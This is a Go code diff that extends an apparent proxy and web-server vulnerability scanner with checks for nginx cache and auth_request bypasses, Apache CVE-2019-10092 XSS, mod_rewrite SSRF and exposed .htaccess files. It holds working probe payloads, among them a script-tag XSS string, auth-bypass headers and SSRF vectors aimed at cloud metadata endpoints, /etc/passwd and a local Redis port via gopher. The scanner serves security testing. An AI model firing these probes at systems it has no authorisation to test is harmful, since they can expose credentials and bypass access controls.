@@ -12,12 +12,14 @@ import (
 // ExtendedVulnResult contains results from extended/medium-priority vulnerability checks
 type ExtendedVulnResult struct {
 	// Nginx extended checks
-	NginxVersionDetected    bool     `json:"nginx_version_detected"`
-	NginxVersion            string   `json:"nginx_version,omitempty"`
-	NginxConfigExposed      bool     `json:"nginx_config_exposed"`
-	NginxConfigPaths        []string `json:"nginx_config_paths,omitempty"`
-	WebSocketAbuseVulnerable bool    `json:"websocket_abuse_vulnerable"`
-	WebSocketIssues         []string `json:"websocket_issues,omitempty"`
+	NginxVersionDetected       bool     `json:"nginx_version_detected"`
+	NginxVersion               string   `json:"nginx_version,omitempty"`
+	NginxConfigExposed         bool     `json:"nginx_config_exposed"`
+	NginxConfigPaths           []string `json:"nginx_config_paths,omitempty"`
+	NginxProxyCacheBypass      bool     `json:"nginx_proxy_cache_bypass"`
+	NginxSubrequestAuthBypass  bool     `json:"nginx_subrequest_auth_bypass"`
+	WebSocketAbuseVulnerable   bool     `json:"websocket_abuse_vulnerable"`
+	WebSocketIssues            []string `json:"websocket_issues,omitempty"`
 
 	// HTTP/2 checks
 	HTTP2SmugglingVulnerable bool     `json:"http2_smuggling_vulnerable"`
@@ -28,10 +30,13 @@ type ExtendedVulnResult struct {
 	ProxyAuthBypassMethods   []string `json:"proxy_auth_bypass_methods,omitempty"`
 
 	// Apache extended checks
-	ApacheServerStatusExposed bool   `json:"apache_server_status_exposed"`
-	ServerStatusPath          string `json:"server_status_path,omitempty"`
-	CGIScriptExposed          bool   `json:"cgi_script_exposed"`
+	ApacheServerStatusExposed bool     `json:"apache_server_status_exposed"`
+	ServerStatusPath          string   `json:"server_status_path,omitempty"`
+	CGIScriptExposed          bool     `json:"cgi_script_exposed"`
 	CGIScriptPaths            []string `json:"cgi_script_paths,omitempty"`
+	ApacheCVE_2019_10092      bool     `json:"apache_cve_2019_10092"` // XSS in error page
+	ApacheModRewriteSSRF      bool     `json:"apache_mod_rewrite_ssrf"`
+	ApacheHtaccessOverride    bool     `json:"apache_htaccess_override"`
 }
 
 // testNginxVersionDetection performs precise nginx version fingerprinting
@@ -617,6 +622,288 @@ func (c *Checker) testCGIScriptExposure(client *http.Client, result *ProxyResult
 	return len(exposedScripts) > 0, exposedScripts
 }
 
+// testNginxProxyCacheBypass tests for nginx proxy cache key manipulation
+func (c *Checker) testNginxProxyCacheBypass(client *http.Client, result *ProxyResult) bool {
+	if c.debug {
+		result.DebugInfo += "[NGINX CACHE] Testing for proxy cache bypass via key manipulation\n"
+	}
+
+	// Test 1: Cache key manipulation via Vary header
+	baselineReq, err := http.NewRequest("GET", c.config.ValidationURL, nil)
+	if err != nil {
+		return false
+	}
+	baselineReq.Header.Set("User-Agent", c.config.UserAgent)
+
+	baselineResp, err := client.Do(baselineReq)
+	if err != nil {
+		return false
+	}
+	baselineBody, _ := io.ReadAll(baselineResp.Body)
+	baselineResp.Body.Close()
+
+	// Test with cache-busting headers that might not be in cache key
+	testReq, err := http.NewRequest("GET", c.config.ValidationURL, nil)
+	if err != nil {
+		return false
+	}
+	testReq.Header.Set("User-Agent", c.config.UserAgent)
+	testReq.Header.Set("X-Cache-Buster", "test123")
+	testReq.Header.Set("Range", "bytes=0-0")
+
+	testResp, err := client.Do(testReq)
+	if err != nil {
+		return false
+	}
+	testBody, _ := io.ReadAll(testResp.Body)
+	testResp.Body.Close()
+
+	// If we get different content, cache might be bypassable
+	if len(baselineBody) != len(testBody) {
+		if c.debug {
+			result.DebugInfo += "  [MEDIUM] Nginx cache bypass possible via unkeyed headers\n"
+		}
+		return true
+	}
+
+	// Test 2: Query string vs no query string (cache key manipulation)
+	queryReq, _ := http.NewRequest("GET", c.config.ValidationURL+"?nocache=1", nil)
+	queryReq.Header.Set("User-Agent", c.config.UserAgent)
+
+	queryResp, err := client.Do(queryReq)
+	if err == nil {
+		defer queryResp.Body.Close()
+		// Check for cache status headers
+		xCacheStatus := queryResp.Header.Get("X-Cache-Status")
+		if xCacheStatus == "BYPASS" || xCacheStatus == "MISS" {
+			if c.debug {
+				result.DebugInfo += "  [MEDIUM] Nginx cache bypass via query string manipulation\n"
+			}
+			return true
+		}
+	}
+
+	return false
+}
+
+// testNginxSubrequestAuthBypass tests for nginx auth_request module bypass
+func (c *Checker) testNginxSubrequestAuthBypass(client *http.Client, result *ProxyResult) bool {
+	if c.debug {
+		result.DebugInfo += "[NGINX AUTH] Testing for auth_request subrequest bypass\n"
+	}
+
+	protectedPaths := []string{
+		"/admin",
+		"/api/admin",
+		"/protected",
+		"/internal",
+		"/management",
+	}
+
+	for _, path := range protectedPaths {
+		// Test 1: Original request with X-Original-URI manipulation
+		req1, err := http.NewRequest("GET", c.config.ValidationURL+path, nil)
+		if err != nil {
+			continue
+		}
+		req1.Header.Set("User-Agent", c.config.UserAgent)
+		req1.Header.Set("X-Original-URI", "/public")
+		req1.Header.Set("X-Original-URL", "/public")
+
+		resp1, err := client.Do(req1)
+		if err != nil {
+			continue
+		}
+		resp1.Body.Close()
+
+		if resp1.StatusCode == 200 {
+			if c.debug {
+				result.DebugInfo += fmt.Sprintf("  [HIGH] Auth bypass via X-Original-URI at: %s\n", path)
+			}
+			return true
+		}
+
+		// Test 2: Request with subrequest error codes
+		req2, _ := http.NewRequest("GET", c.config.ValidationURL+path, nil)
+		req2.Header.Set("User-Agent", c.config.UserAgent)
+		req2.Header.Set("X-Accel-Redirect", "/public")
+
+		resp2, err := client.Do(req2)
+		if err == nil {
+			resp2.Body.Close()
+			if resp2.StatusCode == 200 {
+				if c.debug {
+					result.DebugInfo += fmt.Sprintf("  [HIGH] Auth bypass via X-Accel-Redirect at: %s\n", path)
+				}
+				return true
+			}
+		}
+	}
+
+	return false
+}
+
+// testApacheCVE_2019_10092 tests for XSS in Apache mod_proxy error page
+func (c *Checker) testApacheCVE_2019_10092(client *http.Client, result *ProxyResult) bool {
+	if c.debug {
+		result.DebugInfo += "[APACHE CVE-2019-10092] Testing for XSS in mod_proxy error page\n"
+	}
+
+	// CVE-2019-10092: XSS in error pages when using mod_proxy_ftp
+	xssPayload := "<script>alert(1)</script>"
+	testURL := c.config.ValidationURL + "/ftp://test" + xssPayload
+
+	req, err := http.NewRequest("GET", testURL, nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("User-Agent", c.config.UserAgent)
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return false
+	}
+
+	body, _ := io.ReadAll(resp.Body)
+	resp.Body.Close()
+
+	bodyStr := string(body)
+
+	// Check if XSS payload is reflected without encoding
+	if strings.Contains(bodyStr, xssPayload) && !strings.Contains(bodyStr, "&lt;script&gt;") {
+		if c.debug {
+			result.DebugInfo += "  [MEDIUM] XSS in Apache mod_proxy error page (CVE-2019-10092)\n"
+		}
+		return true
+	}
+
+	return false
+}
+
+// testApacheModRewriteSSRF tests for mod_rewrite-based SSRF
+func (c *Checker) testApacheModRewriteSSRF(client *http.Client, result *ProxyResult) bool {
+	if c.debug {
+		result.DebugInfo += "[APACHE MOD_REWRITE] Testing for SSRF via RewriteRule\n"
+	}
+
+	// Test various mod_rewrite SSRF vectors
+	ssrfVectors := []string{
+		"http://127.0.0.1:22",
+		"http://localhost:3306",
+		"http://169.254.169.254/latest/meta-data/",
+		"http://metadata.google.internal/computeMetadata/v1/",
+		"file:///etc/passwd",
+		"gopher://127.0.0.1:6379/_",
+	}
+
+	for _, vector := range ssrfVectors {
+		// Try to trigger SSRF via various parameters
+		testPaths := []string{
+			"/?url=" + vector,
+			"/?redirect=" + vector,
+			"/?proxy=" + vector,
+			"/proxy?url=" + vector,
+		}
+
+		for _, path := range testPaths {
+			req, err := http.NewRequest("GET", c.config.ValidationURL+path, nil)
+			if err != nil {
+				continue
+			}
+			req.Header.Set("User-Agent", c.config.UserAgent)
+
+			resp, err := client.Do(req)
+			if err != nil {
+				continue
+			}
+
+			body, _ := io.ReadAll(resp.Body)
+			resp.Body.Close()
+
+			bodyStr := strings.ToLower(string(body))
+
+			// Check for SSRF indicators
+			if strings.Contains(bodyStr, "ssh-") || // SSH banner
+				strings.Contains(bodyStr, "mysql") || // MySQL
+				strings.Contains(bodyStr, "instance-id") || // AWS metadata
+				strings.Contains(bodyStr, "root:x:0:0") { // /etc/passwd
+				if c.debug {
+					result.DebugInfo += fmt.Sprintf("  [CRITICAL] mod_rewrite SSRF to: %s\n", vector)
+				}
+				return true
+			}
+		}
+	}
+
+	return false
+}
+
+// testApacheHtaccessOverride tests for htaccess directory access control bypass
+func (c *Checker) testApacheHtaccessOverride(client *http.Client, result *ProxyResult) bool {
+	if c.debug {
+		result.DebugInfo += "[APACHE HTACCESS] Testing for .htaccess override bypass\n"
+	}
+
+	sensitivePaths := []string{
+		"/.htaccess",
+		"/.htpasswd",
+		"/admin/.htaccess",
+		"/wp-admin/.htaccess",
+		"/config/.htaccess",
+	}
+
+	for _, path := range sensitivePaths {
+		// Test 1: Direct access
+		req1, err := http.NewRequest("GET", c.config.ValidationURL+path, nil)
+		if err != nil {
+			continue
+		}
+		req1.Header.Set("User-Agent", c.config.UserAgent)
+
+		resp1, err := client.Do(req1)
+		if err != nil {
+			continue
+		}
+
+		body, _ := io.ReadAll(resp1.Body)
+		resp1.Body.Close()
+
+		if resp1.StatusCode == 200 {
+			bodyStr := strings.ToLower(string(body))
+			// Check for .htaccess content indicators
+			if strings.Contains(bodyStr, "authtype") ||
+				strings.Contains(bodyStr, "require valid-user") ||
+				strings.Contains(bodyStr, "deny from") ||
+				strings.Contains(bodyStr, "rewriterule") {
+				if c.debug {
+					result.DebugInfo += fmt.Sprintf("  [HIGH] .htaccess file exposed: %s\n", path)
+				}
+				return true
+			}
+		}
+
+		// Test 2: Bypass via encoding
+		encodedPath := strings.ReplaceAll(path, "/", "%2f")
+		req2, _ := http.NewRequest("GET", c.config.ValidationURL+encodedPath, nil)
+		req2.Header.Set("User-Agent", c.config.UserAgent)
+
+		resp2, err := client.Do(req2)
+		if err == nil {
+			body2, _ := io.ReadAll(resp2.Body)
+			resp2.Body.Close()
+
+			if resp2.StatusCode == 200 && len(body2) > 0 {
+				if c.debug {
+					result.DebugInfo += fmt.Sprintf("  [HIGH] .htaccess bypass via encoding: %s\n", path)
+				}
+				return true
+			}
+		}
+	}
+
+	return false
+}
+
 // performExtendedVulnerabilityChecks runs all extended/medium-priority vulnerability checks
 func (c *Checker) performExtendedVulnerabilityChecks(client *http.Client, result *ProxyResult) *ExtendedVulnResult {
 	extendedResult := &ExtendedVulnResult{}
@@ -624,6 +911,8 @@ func (c *Checker) performExtendedVulnerabilityChecks(client *http.Client, result
 	// Nginx extended checks
 	extendedResult.NginxVersionDetected, extendedResult.NginxVersion = c.testNginxVersionDetection(client, result)
 	extendedResult.NginxConfigExposed, extendedResult.NginxConfigPaths = c.testNginxConfigExposure(client, result)
+	extendedResult.NginxProxyCacheBypass = c.testNginxProxyCacheBypass(client, result)
+	extendedResult.NginxSubrequestAuthBypass = c.testNginxSubrequestAuthBypass(client, result)
 
 	// WebSocket checks
 	extendedResult.WebSocketAbuseVulnerable, extendedResult.WebSocketIssues = c.testWebSocketAbuseVulnerabilities(client, result)
@@ -637,6 +926,9 @@ func (c *Checker) performExtendedVulnerabilityChecks(client *http.Client, result
 	// Apache extended checks
 	extendedResult.ApacheServerStatusExposed, extendedResult.ServerStatusPath = c.testApacheServerStatus(client, result)
 	extendedResult.CGIScriptExposed, extendedResult.CGIScriptPaths = c.testCGIScriptExposure(client, result)
+	extendedResult.ApacheCVE_2019_10092 = c.testApacheCVE_2019_10092(client, result)
+	extendedResult.ApacheModRewriteSSRF = c.testApacheModRewriteSSRF(client, result)
+	extendedResult.ApacheHtaccessOverride = c.testApacheHtaccessOverride(client, result)
 
 	return extendedResult
 }
